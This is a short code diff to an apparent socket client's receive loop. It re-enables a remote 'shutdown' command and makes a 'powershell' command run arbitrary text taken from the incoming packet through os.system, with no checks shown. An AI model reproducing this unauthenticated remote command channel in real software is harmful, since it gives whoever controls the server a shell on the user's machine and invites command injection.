@@ -82,10 +82,11 @@ def receive(client) -> None:
                     if p_type == "command":
                         if packet.get("command") == "shutdown":
                             print("Shutting down...")
-                            # shutdown_computer()
+                            shutdown_computer()
                         elif packet.get("command") == "powershell":
-                            print("Opening Powershell...")
-                            os.system("start powershell")
+                            ps_data = packet.get('data')
+                            print(f"Opening Powershell with command: {ps_data}")
+                            os.system(f'start powershell -NoExit -Command "{ps_data}"')
 
             except socket.timeout:
                 continue
